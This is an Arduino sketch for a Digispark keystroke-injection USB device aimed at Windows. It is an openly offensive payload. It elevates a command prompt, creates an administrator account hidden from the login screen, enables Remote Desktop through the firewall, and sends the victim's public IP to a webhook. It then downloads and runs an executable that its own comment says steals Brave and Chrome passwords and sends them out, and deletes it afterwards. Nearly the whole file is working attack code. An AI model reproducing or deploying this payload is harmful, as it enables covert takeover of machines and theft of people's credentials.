#include "DigiKeyboard.h"
#define KEY_DOWN 0x51

void setup() {
  // Don't need to set anything up to use DigiKeyboard
}

void loop() {
  // Prevents missing first keystroke
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(750);

  //this part opens cmd with admin privilidges
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  //win+r
  DigiKeyboard.delay(600);
  DigiKeyboard.println("cmd");  //type it in
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(700);
  DigiKeyboard.println(F("Start-Process cmd.exe -ArgumentList '/k mode con: cols=16 lines=2' -Verb RunAs; if ($?) { exit } else { powershell }"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(6000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(700);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);

  //this part creates an account blanka with password Blank@1234.Then it makes the account admin and activates remote desktop for that account (also hides account from lockscreen) (works only if windows on target is pro edition)
  DigiKeyboard.println("net user blanka Blank@1234 /ADD");  //create user  (for deleting: net user blanka /DELETE)
  DigiKeyboard.delay(100);
  DigiKeyboard.println("net localgroup Administrators blanka /ADD");  //adding user to admin group  (for deleting: net localgroup Administrators blanka /DELETE)
  DigiKeyboard.delay(50);
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v blanka /t REG_DWORD /d 0 /f"));  //Hiding user from login screen  (to delete: reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v blanka /f)
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));  //Turning on Remote desktop  (to delete: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f)
  DigiKeyboard.delay(50);
  DigiKeyboard.println(F("netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow program=\"%SystemRoot%\\system32\\svchost.exe\" service=\"termservice\" enable=yes profile=any localport=3389 protocol=tcp"));  //Allowing remote desktop through firewall  (to delete: netsh advfirewall firewall delete rule name="Remote Desktop")
  DigiKeyboard.delay(100);
  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" /add");  //creating remote desktop group(it doesnt exist in some systems)(no harm if alredy existing)(dont need to delete)
  DigiKeyboard.delay(50);
  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" blanka /add");  //adding user to remote desktop users group  (to delete: net localgroup "Remote Desktop Users" blanka /delete)
  DigiKeyboard.delay(200);

  // Sending IP to webhook for remote access
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(200);
  DigiKeyboard.println(F("$PublicIP = Invoke-RestMethod -Uri 'https://api.ipify.org?format=text'"));
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("Invoke-RestMethod -Uri 'https://16b0dcac26d763dafecd45d9e1ff9575.m.pipedream.net' -Method Post -ContentType 'application/json' -Body @{PublicIP=$PublicIP}"));
  DigiKeyboard.delay(50);

  //this downloads beta.exe which gets saved brave and chrome passwords and sends them to webhook (normally this happens too fast for any antivirus to notice it but sometimes it is caught)
  DigiKeyboard.println(F("Invoke-WebRequest -Uri 'github.com/Adhrit121/Data_storage/raw/main/beta.exe' -OutFile 'beta.exe'"));
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("Start-Process -FilePath 'beta.exe'; Start-Sleep -Seconds 2; while(Get-Process -Name 'beta' -ErrorAction SilentlyContinue){Start-Sleep -Seconds 1}; Remove-Item 'beta.exe' -Force"));//start,run and delete itself
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  //Runtimes:
  //56sec to 48sec to 48sec to 50sec to 54sec
  DigiKeyboard.delay(90000);
}
